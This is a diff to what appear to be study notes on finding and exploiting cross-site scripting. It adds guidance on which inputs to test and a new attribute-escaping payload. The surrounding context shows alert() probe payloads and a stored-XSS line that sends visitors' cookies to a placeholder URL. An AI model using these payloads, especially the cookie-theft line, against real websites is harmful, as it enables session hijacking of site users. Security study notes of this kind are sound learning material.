@@ -17,8 +17,10 @@
 ### Finding XSS
 
 > Look at every user input, and test if it's displayed as output.
+* [[HTTP]] headers, `POST`/`GET` variables, and [[Cookies]] variables.
+
 > Try injecting HTML tag to see if the HTML is interpreted: `<i>, <h1>`.
-> Try injecting JavaScript: `<script>alert('XSS')</script>`
+> Try injecting JavaScript: `<script>alert('XSS')</script>`.
 
 > To exploit the XSS, there are different types of attacks:
 1. Reflected.
@@ -157,6 +159,8 @@ mins"> <svg onload=alert(1)>     //closing off a tag and adding a new one.
 " onfocus=alert() autofocus x="  //closing off an attribute and adding a new one and 
 closing off the rest.
 
+"> <body onload="alert()         // closing off an attribute and adding a new element to close of the remaining qoute and angle bracket.
+
 minso> </select> <svg onload=alert()>
 
 <img src=1 onerror=alert(1)>
@@ -266,6 +270,8 @@ toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constru
 <script>document.location='URL-to-send-to/'+document.cookie</script>
 ```
 > This is a stored attack, meaning it will be put in a place where users visit, so their cookies are stolen and sent to that website URL.
+
+> The subdomain of the cookie should be the same as the subdomain of the website in which the cookie is.
 
 ---
 
